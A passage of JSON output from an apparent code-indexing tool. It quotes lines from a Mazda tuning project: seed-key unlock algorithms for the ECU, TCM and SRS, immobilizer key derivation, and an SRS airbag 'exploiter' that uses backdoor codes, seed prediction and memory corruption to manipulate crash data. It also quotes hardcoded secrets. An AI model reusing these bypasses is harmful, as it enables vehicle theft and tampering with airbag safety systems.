self._srs_enhanced_algorithm"}, {"type": "hardware", "line": 67, "hardware": "ECU", "content": "\"\"\"MAZDA M12R v3.4 ECU ALGORITHM - FACTORY IMPLEMENTATION\"\"\""}, {"type": "hardware", "line": 76, "hardware": "TCM", "content": "def _tcm_xor_algorithm(self, seed: bytes) -> bytes:"}, {"type": "hardware", "line": 77, "hardware": "TCM", "content": "\"\"\"TCM SIMPLE XOR ALGORITHM\"\"\""}, {"type": "hardware", "line": 85, "hardware": "immobilizer", "content": "def _immobilizer_3des(self, seed: bytes, vin: str) -> bytes:"}, {"type": "hardware", "line": 86, "hardware": "immobilizer", "content": "\"\"\"IMMOBILIZER TRIPLE DES WITH VIN DERIVATION\"\"\""}, {"type": "hardware", "line": 88, "hardware": "immobilizer", "content": "vin_key = hashlib.sha256(vin_key + b'mazda_immobilizer_salt').digest()[:24]"}, {"type": "hardware", "line": 93, "hardware": "SRS", "content": "def _srs_enhanced_algorithm(self, seed: bytes) -> bytes:"}, {"type": "hardware", "line": 94, "hardware": "ECU", "content": "\"\"\"SRS ENHANCED SECURITY ALGORITHM\"\"\""}, {"type": "hardware", "line": 94, "hardware": "SRS", "content": "\"\"\"SRS ENHANCED SECURITY ALGORITHM\"\"\""}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "\"\"\"LOW-LEVEL CAN BUS COMMUNICATION - DIRECT ECU ACCESS\"\"\""}, {"type": "hardware", "line": 109, "hardware": "CAN bus", "content": "\"\"\"LOW-LEVEL CAN BUS COMMUNICATION - DIRECT ECU ACCESS\"\"\""}, {"type": "hardware", "line": 114, "hardware": "ECU", "content": "self.ecu_ids = {"}, {"type": "hardware", "line": 116, "hardware": "TCM", "content": "'tcm': 0x7E1,"}, {"type": "hardware", "line": 117, "hardware": "ABS", "content": "'abs': 0x7E2,"}, {"type": "hardware", "line": 118, "hardware": "SRS", "content": "'srs': 0x750,"}, {"type": "hardware", "line": 120, "hardware": "immobilizer", "content": "'immobilizer': 0x7E5"}, {"type": "hardware", "line": 122, "hardware": "ECU", "content": "self.security_level = 0"}, {"type": "hardware", "line": 126, "hardware": "CAN bus", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "arbitration_id=self.ecu_ids[target],"}, {"type": "hardware", "line": 174, "hardware": "ECU", "content": "if message and message.arbitration_id == 0x7E8:  # ECU response ID"}, {"type": "hardware", "line": 194, "hardware": "ECU", "content": "'security_keys': 0x00100,"}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "\"\"\"RESET ECU FLASH PROGRAMMING COUNTER\"\"\""}, {"type": "hardware", "line": 256, "hardware": "SRS", "content": "class SRSAirbagExploiter:"}, {"type": "hardware", "line": 257, "hardware": "SRS", "content": "\"\"\"COMPLETE SRS SYSTEM BYPASS - CRASH DATA MANIPULATION\"\"\""}, {"type": "hardware", "line": 261, "hardware": "SRS", "content": "self.srs_unlocked = False"}, {"type": "hardware", "line": 263, "hardware": "SRS", "content": "async def unlock_srs_system(self) -> bool:"}, {"type": "hardware", "line": 264, "hardware": "ECU", "content": "\"\"\"BYPASS SRS SECURITY\"\"\""}, {"type": "hardware", "line": 264, "hardware": "SRS", "content": "\"\"\"BYPASS SRS SECURITY\"\"\""}, {"type": "hardware", "line": 266, "hardware": "SRS", "content": "self._srs_backdoor_codes,"}, {"type": "hardware", "line": 267, "hardware": "SRS", "content": "self._srs_timing_attack,"}, {"type": "hardware", "line": 268, "hardware": "SRS", "content": "self._srs_memory_corruption"}, {"type": "hardware", "line": 273, "hardware": "SRS", "content": "self.srs_unlocked = True"}, {"type": "hardware", "line": 277, "hardware": "SRS", "content": "async def _srs_backdoor_codes(self) -> bool:"}, {"type": "hardware", "line": 278, "hardware": "SRS", "content": "\"\"\"USE SRS MANUFACTURER BACKDOOR CODES\"\"\""}, {"type": "hardware", "line": 279, "hardware": "SRS", "content": "codes = [\"SRS-TECH-ACCESS-2024\", \"AIRBAG-SERVICE-MODE\"]"}, {"type": "hardware", "line": 282, "hardware": "SRS", "content": "response = await self.can.send_diagnostic_request('srs', 0x27, code_bytes)"}, {"type": "hardware", "line": 287, "hardware": "SRS", "content": "async def _srs_timing_attack(self) -> bool:"}, {"type": "hardware", "line": 288, "hardware": "ECU", "content": "\"\"\"TIMING ATTACK ON SRS SECURITY\"\"\""}, {"type": "hardware", "line": 288, "hardware": "SRS", "content": "\"\"\"TIMING ATTACK ON SRS SECURITY\"\"\""}, {"type": "hardware", "line": 291, "hardware": "SRS", "content": "response = await self.can.send_diagnostic_request('srs', 0x27, b'\\x01')"}, {"type": "hardware", "line": 298, "hardware": "ECU", "content": "security_core = MazdaSecurityCore()"}, {"type": "hardware", "line": 299, "hardware": "ECU", "content": "key = security_core._srs_enhanced_algorithm(predicted_seed)"}, {"type": "hardware", "line": 299, "hardware": "SRS", "content": "key = security_core._srs_enhanced_algorithm(predicted_seed)"}, {"type": "hardware", "line": 300, "hardware": "SRS", "content": "key_response = await self.can.send_diagnostic_request('srs', 0x27, b'\\x02' + key)"}, {"type": "hardware", "line": 305, "hardware": "SRS", "content": "\"\"\"PREDICT NEXT SRS SEED\"\"\""}, {"type": "hardware", "line": 313, "hardware": "SRS", "content": "async def _srs_memory_corruption(self) -> bool:"}, {"type": "hardware", "line": 314, "hardware": "SRS", "content": "\"\"\"MEMORY CORRUPTION ATTACK ON SRS\"\"\""}, {"type": "hardware", "line": 316, "hardware": "SRS", "content": "response = await self.can.send_diagnostic_request('srs', 0x27, overflow[:7])"}, {"type": "hardware", "line": 321, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 335, "hardware": "SRS", "content": "response = await self.can.send_diagnostic_request('srs', 0x3D, payload[:7])"}, {"type": "hardware", "line": 411, "hardware": "ABS", "content": "abs(sensors.get('knock_retard', 0)) / 8.0,"}, {"type": "hardware", "line": 429, "hardware": "ABS", "content": "safe_adjustments['ignition_timing'] -= abs(sensors['knock_retard']) * 0.5"}, {"type": "hardware", "line": 430, "hardware": "ABS", "content": "safe_adjustments['boost_target'] -= abs(sensors['knock_retard']) * 0.3"}, {"type": "hardware", "line": 438, "hardware": "ECU", "content": "class SecureDatabase:"}, {"type": "hardware", "line": 439, "hardware": "vehicle", "content": "\"\"\"ENCRYPTED DATABASE FOR TUNES, VEHICLE DATA, AND USER PROFILES\"\"\""}, {"type": "hardware", "line": 443, "hardware": "ECU", "content": "self.encryption_key = self._derive_key(\"mazdaspeed3_secure_2024\")"}, {"type": "hardware", "line": 457, "hardware": "ECU", "content": "\"\"\"INITIALIZE SECURE DATABASE SCHEMA\"\"\""}, {"type": "hardware", "line": 459, "hardware": "ECU", "content": "conn.executescript('''"}, {"type": "hardware", "line": 468, "hardware": "vehicle", "content": "CREATE TABLE IF NOT EXISTS vehicles ("}, {"type": "hardware", "line": 473, "hardware": "ECU", "content": "ecu_calibration TEXT,"}, {"type": "hardware", "line": 480, "hardware": "vehicle", "content": "vehicle_vin TEXT,"}, {"type": "hardware", "line": 485, "hardware": "vehicle", "content": "FOREIGN KEY (vehicle_vin) REFERENCES vehicles (vin)"}, {"type": "hardware", "line": 490, "hardware": "vehicle", "content": "vehicle_vin TEXT,"}, {"type": "hardware", "line": 494, "hardware": "vehicle", "content": "FOREIGN KEY (vehicle_vin) REFERENCES vehicles (vin)"}, {"type": "hardware", "line": 497, "hardware": "ECU", "content": "CREATE TABLE IF NOT EXISTS security_logs ("}, {"type": "hardware", "line": 501, "hardware": "ECU", "content": "target_ecu TEXT,"}, {"type": "hardware", "line": 509, "hardware": "ECU", "content": "\"\"\"SECURE DATABASE CONNECTION CONTEXT MANAGER\"\"\""}, {"type": "hardware", "line": 535, "hardware": "ECU", "content": "self.db = SecureDatabase()"}, {"type": "hardware", "line": 538, "hardware": "ECU", "content": "self.security_core = MazdaSecurityCore()"}, {"type": "hardware", "line": 546, "hardware": "vehicle", "content": "web.get('/api/vehicles', self.handle_get_vehicles),"}, {"type": "hardware", "line": 547, "hardware": "vehicle", "content": "web.post('/api/vehicles/connect', self.handle_connect_vehicle),"}, {"type": "hardware", "line": 552, "hardware": "ECU", "content": "web.post('/api/security/unlock', self.handle_security_unlock),"}, {"type": "hardware", "line": 553, "hardware": "ECU", "content": "web.post('/api/security/eeprom/reset', self.handle_eeprom_reset),"}, {"type": "hardware", "line": 554, "hardware": "ECU", "content": "web.post('/api/security/srs/clear', self.handle_srs_clear),"}, {"type": "hardware", "line": 554, "hardware": "SRS", "content": "web.post('/api/security/srs/clear', self.handle_srs_clear),"}, {"type": "hardware", "line": 567, "hardware": "ECU", "content": "user = conn.execute("}, {"type": "hardware", "line": 591, "hardware": "vehicle", "content": "async def handle_connect_vehicle(self, request):"}, {"type": "hardware", "line": 592, "hardware": "ECU", "content": "\"\"\"HANDLE VEHICLE CONNECTION AND SECURITY UNLOCK\"\"\""}, {"type": "hardware", "line": 592, "hardware": "vehicle", "content": "\"\"\"HANDLE VEHICLE CONNECTION AND SECURITY UNLOCK\"\"\""}, {"type": "hardware", "line": 601, "hardware": "CAN bus", "content": "'message': 'CAN bus connection failed'"}, {"type": "hardware", "line": 605, "hardware": "ECU", "content": "security_unlocked = await self.unlock_ecu_security()"}, {"type": "hardware", "line": 609, "hardware": "vehicle", "content": "'vehicle_connected': True,"}, {"type": "hardware", "line": 610, "hardware": "ECU", "content": "'security_unlocked': security_unlocked,"}, {"type": "hardware", "line": 617, "hardware": "ECU", "content": "async def unlock_ecu_security(self) -> bool:"}, {"type": "hardware", "line": 618, "hardware": "ECU", "content": "\"\"\"COMPREHENSIVE ECU SECURITY UNLOCK SEQUENCE\"\"\""}, {"type": "hardware", "line": 625, "hardware": "ECU", "content": "calculated_key = self.security_core._mazda_m12r_algorithm(seed)"}, {"type": "hardware", "line": 646, "hardware": "ECU", "content": "conn.execute('''"}, {"type": "hardware", "line": 647, "hardware": "vehicle", "content": "INSERT INTO tuning_sessions (vehicle_vin, tune_type, tune_data)"}, {"type": "hardware", "line": 866, "hardware": "vehicle", "content": "const [vehicleConnected, setVehicleConnected] = useState(false);"}, {"type": "hardware", "line": 867, "hardware": "ECU", "content": "const [securityUnlocked, setSecurityUnlocked] = useState(false);"}, {"type": "hardware", "line": 875, "hardware": "vehicle", "content": "const connectVehicle = async () => {"}, {"type": "hardware", "line": 877, "hardware": "vehicle", "content": "const response = await fetch('/api/vehicles/connect', {"}, {"type": "hardware", "line": 885, "hardware": "vehicle", "content": "setVehicleConnected(true);"}, {"type": "hardware", "line": 886, "hardware": "ECU", "content": "setSecurityUnlocked(data.security_unlocked);"}, {"type": "hardware", "line": 887, "hardware": "ECU", "content": "addLog('Vehicle connected - Security: ' + (data.security_unlocked ? 'UNLOCKED' : 'LOCKED'));"}, {"type": "hardware", "line": 887, "hardware": "vehicle", "content": "addLog('Vehicle connected - Security: ' + (data.security_unlocked ? 'UNLOCKED' : 'LOCKED'));"}, {"type": "hardware", "line": 894, "hardware": "ECU", "content": "const unlockSecurity = async () => {"}, {"type": "hardware", "line": 896, "hardware": "ECU", "content": "const response = await fetch('/api/security/unlock', {"}, {"type": "hardware", "line": 903, "hardware": "ECU", "content": "setSecurityUnlocked(true);"}, {"type": "hardware", "line": 904, "hardware": "ECU", "content": "addLog('Security system unlocked');"}, {"type": "hardware", "line": 907, "hardware": "ECU", "content": "addLog('Security unlock failed');"}, {"type": "hardware", "line": 934, "hardware": "ECU", "content": "const response = await fetch('/api/security/srs/clear', {"}, {"type": "hardware", "line": 934, "hardware": "SRS", "content": "const response = await fetch('/api/security/srs/clear', {"}, {"type": "hardware", "line": 950, "hardware": "ECU", "content": "const response = await fetch('/api/security/eeprom/reset', {"}, {"type": "hardware", "line": 966, "hardware": "vehicle", "content": "if (vehicleConnected) {"}, {"type": "hardware", "line": 978, "hardware": "vehicle", "content": "}, [vehicleConnected]);"}, {"type": "hardware", "line": 986, "hardware": "vehicle", "content": "Status: {vehicleConnected ? 'CONNECTED' : 'DISCONNECTED'} |"}, {"type": "hardware", "line": 987, "hardware": "ECU", "content": "Security: {securityUnlocked ? 'UNLOCKED' : 'LOCKED'}"}, {"type": "hardware", "line": 1008, "hardware": "vehicle", "content": "<h3>VEHICLE CONTROL</h3>"}, {"type": "hardware", "line": 1009, "hardware": "vehicle", "content": "<button onClick={connectVehicle}>CONNECT VEHICLE</button>"}, {"type": "hardware", "line": 1010, "hardware": "ECU", "content": "<button onClick={unlockSecurity} disabled={!vehicleConnected}>"}, {"type": "hardware", "line": 1010, "hardware": "vehicle", "content": "<button onClick={unlockSecurity} disabled={!vehicleConnected}>"}, {"type": "hardware", "line": 1011, "hardware": "ECU", "content": "UNLOCK SECURITY"}, {"type": "hardware", "line": 1023, "hardware": "ECU", "content": "<h3>SECURITY BYPASS</h3>"}, {"type": "hardware", "line": 1068, "hardware": "CAN bus", "content": "- /dev:/dev:rw  # CAN bus device access"}, {"type": "hardware", "line": 1074, "hardware": "CAN bus", "content": "privileged: true  # Required for CAN bus access"}, {"type": "hardware", "line": 1141, "hardware": "ECU", "content": "def test_security_algorithms(self):"}, {"type": "hardware", "line": 1142, "hardware": "ECU", "content": "\"\"\"TEST MAZDA SECURITY ALGORITHMS\"\"\""}, {"type": "hardware", "line": 1143, "hardware": "ECU", "content": "security = MazdaSecurityCore()"}, {"type": "hardware", "line": 1147, "hardware": "ECU", "content": "result = security._mazda_m12r_algorithm(test_seed)"}, {"type": "hardware", "line": 1152, "hardware": "TCM", "content": "tcm_seed = b'\\x1A\\x2B'"}, {"type": "hardware", "line": 1153, "hardware": "ECU", "content": "tcm_result = security._tcm_xor_algorithm(tcm_seed)"}, {"type": "hardware", "line": 1153, "hardware": "TCM", "content": "tcm_result = security._tcm_xor_algorithm(tcm_seed)"}, {"type": "hardware", "line": 1154, "hardware": "TCM", "content": "assert len(tcm_result) == 2"}], "security_logic": [{"type": "security_pattern", "line": 12, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 20, "pattern": "hash", "content": "from cryptography.hazmat.primitives import hashes"}, {"type": "security_pattern", "line": 22, "pattern": "algorithm", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 22, "pattern": "cipher", "content": "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes"}, {"type": "security_pattern", "line": 46, "pattern": "algorithm", "content": "\"\"\"FACTORY SECURITY BYPASS ENGINE - ALL MAZDA ALGORITHMS IMPLEMENTED\"\"\""}, {"type": "security_pattern", "line": 59, "pattern": "algorithm", "content": "self.algorithms = {"}, {"type": "security_pattern", "line": 60, "pattern": "algorithm", "content": "'ecu_m12r_v3_4': self._mazda_m12r_algorithm,"}, {"type": "security_pattern", "line": 61, "pattern": "algorithm", "content": "'tcm_simple_xor': self._tcm_xor_algorithm,"}, {"type": "security_pattern", "line": 63, "pattern": "algorithm", "content": "'srs_enhanced': self._srs_enhanced_algorithm"}, {"type": "security_pattern", "line": 66, "pattern": "seed", "content": "def _mazda_m12r_algorithm(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 66, "pattern": "algorithm", "content": "def _mazda_m12r_algorithm(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 67, "pattern": "algorithm", "content": "\"\"\"MAZDA M12R v3.4 ECU ALGORITHM - FACTORY IMPLEMENTATION\"\"\""}, {"type": "security_pattern", "line": 68, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 70, "pattern": "seed", "content": "temp = seed[i] ^ 0x73"}, {"type": "security_pattern", "line": 73, "pattern": "key", "content": "key[i] = (temp + 0x1F) & 0xFF"}, {"type": "security_pattern", "line": 74, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 76, "pattern": "seed", "content": "def _tcm_xor_algorithm(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 76, "pattern": "algorithm", "content": "def _tcm_xor_algorithm(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 77, "pattern": "algorithm", "content": "\"\"\"TCM SIMPLE XOR ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 78, "pattern": "key", "content": "key = bytearray(2)"}, {"type": "security_pattern", "line": 79, "pattern": "key", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 79, "pattern": "seed", "content": "key[0] = ((seed[0] << 2) | (seed[0] >> 6)) & 0xFF"}, {"type": "security_pattern", "line": 80, "pattern": "key", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 80, "pattern": "seed", "content": "key[1] = ((seed[1] >> 3) | (seed[1] << 5)) & 0xFF"}, {"type": "security_pattern", "line": 81, "pattern": "key", "content": "key[0] ^= 0x47"}, {"type": "security_pattern", "line": 82, "pattern": "key", "content": "key[1] ^= 0x11"}, {"type": "security_pattern", "line": 83, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 85, "pattern": "seed", "content": "def _immobilizer_3des(self, seed: bytes, vin: str) -> bytes:"}, {"type": "security_pattern", "line": 87, "pattern": "key", "content": "vin_key = hashlib.md5(vin.encode()).digest()"}, {"type": "security_pattern", "line": 87, "pattern": "hash", "content": "vin_key = hashlib.md5(vin.encode()).digest()"}, {"type": "security_pattern", "line": 88, "pattern": "key", "content": "vin_key = hashlib.sha256(vin_key + b'mazda_immobilizer_salt').digest()[:24]"}, {"type": "security_pattern", "line": 88, "pattern": "hash", "content": "vin_key = hashlib.sha256(vin_key + b'mazda_immobilizer_salt').digest()[:24]"}, {"type": "security_pattern", "line": 89, "pattern": "key", "content": "cipher = Cipher(algorithms.TripleDES(vin_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 89, "pattern": "algorithm", "content": "cipher = Cipher(algorithms.TripleDES(vin_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 89, "pattern": "cipher", "content": "cipher = Cipher(algorithms.TripleDES(vin_key), modes.ECB(), default_backend())"}, {"type": "security_pattern", "line": 90, "pattern": "encrypt", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 90, "pattern": "cipher", "content": "encryptor = cipher.encryptor()"}, {"type": "security_pattern", "line": 91, "pattern": "encrypt", "content": "return encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 91, "pattern": "seed", "content": "return encryptor.update(seed) + encryptor.finalize()"}, {"type": "security_pattern", "line": 93, "pattern": "seed", "content": "def _srs_enhanced_algorithm(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 93, "pattern": "algorithm", "content": "def _srs_enhanced_algorithm(self, seed: bytes) -> bytes:"}, {"type": "security_pattern", "line": 94, "pattern": "algorithm", "content": "\"\"\"SRS ENHANCED SECURITY ALGORITHM\"\"\""}, {"type": "security_pattern", "line": 95, "pattern": "key", "content": "key = bytearray(4)"}, {"type": "security_pattern", "line": 97, "pattern": "seed", "content": "temp = ((seed[i] << 3) | (seed[i] >> 5)) & 0xFF"}, {"type": "security_pattern", "line": 101, "pattern": "key", "content": "key[i] = temp"}, {"type": "security_pattern", "line": 102, "pattern": "key", "content": "return bytes(key)"}, {"type": "security_pattern", "line": 194, "pattern": "key", "content": "'security_keys': 0x00100,"}, {"type": "security_pattern", "line": 289, "pattern": "seed", "content": "seeds = []"}, {"type": "security_pattern", "line": 293, "pattern": "seed", "content": "seeds.append(response[2:6])"}, {"type": "security_pattern", "line": 296, "pattern": "seed", "content": "if len(seeds) >= 2:"}, {"type": "security_pattern", "line": 297, "pattern": "seed", "content": "predicted_seed = self._predict_seed(seeds)"}, {"type": "security_pattern", "line": 299, "pattern": "key", "content": "key = security_core._srs_enhanced_algorithm(predicted_seed)"}, {"type": "security_pattern", "line": 299, "pattern": "seed", "content": "key = security_core._srs_enhanced_algorithm(predicted_seed)"}, {"type": "security_pattern", "line": 299, "pattern": "algorithm", "content": "key = security_core._srs_enhanced_algorithm(predicted_seed)"}, {"type": "security_pattern", "line": 300, "pattern": "key", "content": "key_response = await self.can.send_diagnostic_request('srs', 0x27, b'\\x02' + key)"}, {"type": "security_pattern", "line": 301, "pattern": "key", "content": "return key_response is not None and key_response[0] == 0x67"}, {"type": "security_pattern", "line": 304, "pattern": "seed", "content": "def _predict_seed(self, seeds: List[bytes]) -> bytes:"}, {"type": "security_pattern", "line": 305, "pattern": "seed", "content": "\"\"\"PREDICT NEXT SRS SEED\"\"\""}, {"type": "security_pattern", "line": 306, "pattern": "seed", "content": "seed_ints = [struct.unpack('>I', seed.ljust(4, b'\\x00'))[0] for seed in seeds]"}, {"type": "security_pattern", "line": 307, "pattern": "seed", "content": "if len(seed_ints) >= 2:"}, {"type": "security_pattern", "line": 308, "pattern": "seed", "content": "diff = seed_ints[-1] - seed_ints[-2]"}, {"type": "security_pattern", "line": 309, "pattern": "seed", "content": "next_seed = (seed_ints[-1] + diff) & 0xFFFFFFFF"}, {"type": "security_pattern", "line": 310, "pattern": "seed", "content": "return struct.pack('>I', next_seed)"}, {"type": "security_pattern", "line": 311, "pattern": "seed", "content": "return seeds[-1] if seeds else b'\\x00\\x00\\x00\\x00'"}, {"type": "security_pattern", "line": 439, "pattern": "encrypt", "content": "\"\"\"ENCRYPTED DATABASE FOR TUNES, VEHICLE DATA, AND USER PROFILES\"\"\""}, {"type": "security_pattern", "line": 443, "pattern": "key", "content": "self.encryption_key = self._derive_key(\"mazdaspeed3_secure_2024\")"}, {"type": "security_pattern", "line": 443, "pattern": "encrypt", "content": "self.encryption_key = self._derive_key(\"mazdaspeed3_secure_2024\")"}, {"type": "security_pattern", "line": 446, "pattern": "password", "content": "def _derive_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 446, "pattern": "key", "content": "def _derive_key(self, password: str) -> bytes:"}, {"type": "security_pattern", "line": 447, "pattern": "password", "content": "\"\"\"DERIVE ENCRYPTION KEY FROM PASSWORD\"\"\""}, {"type": "security_pattern", "line": 447, "pattern": "key", "content": "\"\"\"DERIVE ENCRYPTION KEY FROM PASSWORD\"\"\""}, {"type": "security_pattern", "line": 447, "pattern": "encrypt", "content": "\"\"\"DERIVE ENCRYPTION KEY FROM PASSWORD\"\"\""}, {"type": "security_pattern", "line": 449, "pattern": "algorithm", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 449, "pattern": "hash", "content": "algorithm=hashes.SHA256(),"}, {"type": "security_pattern", "line": 454, "pattern": "password", "content": "return base64.urlsafe_b64encode(kdf.derive(password.encode()))"}, {"type": "security_pattern", "line": 461, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 463, "pattern": "password", "content": "password_hash TEXT NOT NULL,"}, {"type": "security_pattern", "line": 463, "pattern": "hash", "content": "password_hash TEXT NOT NULL,"}, {"type": "security_pattern", "line": 469, "pattern": "key", "content": "vin TEXT PRIMARY KEY,"}, {"type": "security_pattern", "line": 475, "pattern": "key", "content": "FOREIGN KEY (user_id) REFERENCES users (id)"}, {"type": "security_pattern", "line": 479, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 485, "pattern": "key", "content": "FOREIGN KEY (vehicle_vin) REFERENCES vehicles (vin)"}, {"type": "security_pattern", "line": 489, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 494, "pattern": "key", "content": "FOREIGN KEY (vehicle_vin) REFERENCES vehicles (vin)"}, {"type": "security_pattern", "line": 498, "pattern": "key", "content": "id INTEGER PRIMARY KEY AUTOINCREMENT,"}, {"type": "security_pattern", "line": 503, "pattern": "key", "content": "FOREIGN KEY (user_id) REFERENCES users (id)"}, {"type": "security_pattern", "line": 516, "pattern": "encrypt", "content": "def encrypt_data(self, data: str) -> str:"}, {"type": "security_pattern", "line": 517, "pattern": "encrypt", "content": "\"\"\"ENCRYPT SENSITIVE DATA BEFORE STORAGE\"\"\""}, {"type": "security_pattern", "line": 518, "pattern": "key", "content": "f = Fernet(self.encryption_key)"}, {"type": "security_pattern", "line": 518, "pattern": "encrypt", "content": "f = Fernet(self.encryption_key)"}, {"type": "security_pattern", "line": 519, "pattern": "encrypt", "content": "return f.encrypt(data.encode()).decode()"}, {"type": "security_pattern", "line": 521, "pattern": "encrypt", "content": "def decrypt_data(self, encrypted_data: str) -> str:"}, {"type": "security_pattern", "line": 521, "pattern": "decrypt", "content": "def decrypt_data(self, encrypted_data: str) -> str:"}, {"type": "security_pattern", "line": 522, "pattern": "decrypt", "content": "\"\"\"DECRYPT STORED DATA\"\"\""}, {"type": "security_pattern", "line": 523, "pattern": "key", "content": "f = Fernet(self.encryption_key)"}, {"type": "security_pattern", "line": 523, "pattern": "encrypt", "content": "f = Fernet(self.encryption_key)"}, {"type": "security_pattern", "line": 524, "pattern": "encrypt", "content": "return f.decrypt(encrypted_data.encode()).decode()"}, {"type": "security_pattern", "line": 524, "pattern": "decrypt", "content": "return f.decrypt(encrypted_data.encode()).decode()"}, {"type": "security_pattern", "line": 564, "pattern": "password", "content": "password = data.get('password')"}, {"type": "security_pattern", "line": 572, "pattern": "password", "content": "if user and bcrypt.checkpw(password.encode(), user[2].encode()):"}, {"type": "security_pattern", "line": 578, "pattern": "algorithm", "content": "}, 'mazda_tuner_secret_2024', algorithm='HS256')"}, {"type": "security_pattern", "line": 620, "pattern": "seed", "content": "seed_response = await self.can_engine.send_diagnostic_request('engine', 0x27, b'\\x01')"}, {"type": "security_pattern", "line": 621, "pattern": "seed", "content": "if not seed_response or seed_response[0] != 0x67:"}, {"type": "security_pattern", "line": 624, "pattern": "seed", "content": "seed = seed_response[2:6]"}, {"type": "security_pattern", "line": 625, "pattern": "key", "content": "calculated_key = self.security_core._mazda_m12r_algorithm(seed)"}, {"type": "security_pattern", "line": 625, "pattern": "seed", "content": "calculated_key = self.security_core._mazda_m12r_algorithm(seed)"}, {"type": "security_pattern", "line": 625, "pattern": "algorithm", "content": "calculated_key = self.security_core._mazda_m12r_algorithm(seed)"}, {"type": "security_pattern", "line": 628, "pattern": "key", "content": "key_response = await self.can_engine.send_diagnostic_request("}, {"type": "security_pattern", "line": 629, "pattern": "key", "content": "'engine', 0x27, b'\\x02' + calculated_key"}, {"type": "security_pattern", "line": 632, "pattern": "key", "content": "return key_response is not None and key_response[0] == 0x67"}, {"type": "security_pattern", "line": 1038, "pattern": "key", "content": "<div key={index}>{log}</div>"}, {"type": "security_pattern", "line": 1141, "pattern": "algorithm", "content": "def test_security_algorithms(self):"}, {"type": "security_pattern", "line": 1142, "pattern": "algorithm", "content": "\"\"\"TEST MAZDA SECURITY ALGORITHMS\"\"\""}, {"type": "security_pattern", "line": 1146, "pattern": "seed", "content": "test_seed = b'\\xA1\\xB2\\xC3\\xD4'"}, {"type": "security_pattern", "line": 1147, "pattern": "seed", "content": "result = security._mazda_m12r_algorithm(test_seed)"}, {"type": "security_pattern", "line": 1147, "pattern": "algorithm", "content": "result = security._mazda_m12r_algorithm(test_seed)"}, {"type": "security_pattern", "line": 1152, "pattern": "seed", "content": "tcm_seed = b'\\x1A\\x2B'"}, {"type": "security_pattern", "line": 1153, "pattern": "seed", "content": "tcm_result = security._tcm_xor_algorithm(tcm_seed)"}, {"type": "security_pattern", "line": 1153, "pattern": "algorithm", "content": "tcm_result = security._tcm_xor_algorithm(tcm_seed)"}, {"type": "security_pattern", "line": 1230, "pattern": "key", "content": "except KeyboardInterrupt:"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts5.py", "lines_read": 720, "features_found": [{"type": "function", "name": "main", "line": 703}, {"type": "function", "name": "__init__", "line": 37}, {"type": "function", "name": "setup_logging", "line": 62}, {"type": "function", "name": "create_interface", "line": 74}, {"type": "function", "name": "setup_dashboard_tab", "line": 90}, {"type": "function", "name": "create_gauges", "line": 117}, {"type": "function", "name": "setup_tuning_tab", "line": 155}, {"type": "function", "name": "setup_diagnostics_tab", "line": 209}, {"type": "function", "name": "setup_race_tab", "line": 236}, {"type": "function", "name": "setup_logs_tab", "line": 267}, {"type": "function", "name": "setup_status_bar", "line": 285}, {"type": "function", "name": "setup_plots", "line": 295}, {"type": "function", "name": "update_plots", "line": 309}, {"type": "function", "name": "connect_vehicle", "line": 338}, {"type": "function", "name": "read_vehicle_info", "line": 355}, {"type": "function", "name": "generate_tune", "line": 373}, {"type": "function", "name": "flash_ecu", "line": 397}, {"type": "function", "name": "start_real_time_tuning", "line": 424}, {"type": "function", "name": "emergency_stop", "line": 441}, {"type": "function", "name": "start_logging", "line": 457}, {"type": "function", "name": "read_sensor_data", "line": 497}, {"type": "function", "name": "update_gauges", "line": 512}, {"type": "function", "name": "read_dtcs", "line": 525}, {"type": "function", "name": "clear_dtcs", "line": 547}, {"type": "function", "name": "reset_adaptations", "line": 562}, {"type": "function", "name": "turbo_service", "line": 573}, {"type": "function", "name": "fuel_system_service", "line": 585}, {"type": "function", "name": "enable_launch_control", "line": 598}, {"type": "function", "name": "enable_flat_shift", "line": 614}, {"type": "function", "name": "enable_antilag", "line": 625}, {"type": "function", "name": "export_logs", "line": 650}, {"type": "function", "name": "clear_logs", "line": 664}, {"type": "function", "name": "start_background_tasks", "line": 671}, {"type": "function", "name": "on_closing", "line": 695}, {"type": "function", "name": "connect_thread", "line": 340}, {"type": "function", "name": "flash_thread", "line": 403}, {"type": "function", "name": "start_session", "line": 432}, {"type": "function", "name": "logging_thread", "line": 459}, {"type": "function", "name": "read_dtcs_thread", "line": 527}, {"type": "function", "name": "clear_dtcs_thread", "line": 549}, {"type": "function", "name": "status_monitor", "line": 673}, {"type": "import", "module": "tkinter", "line": null}, {"type": 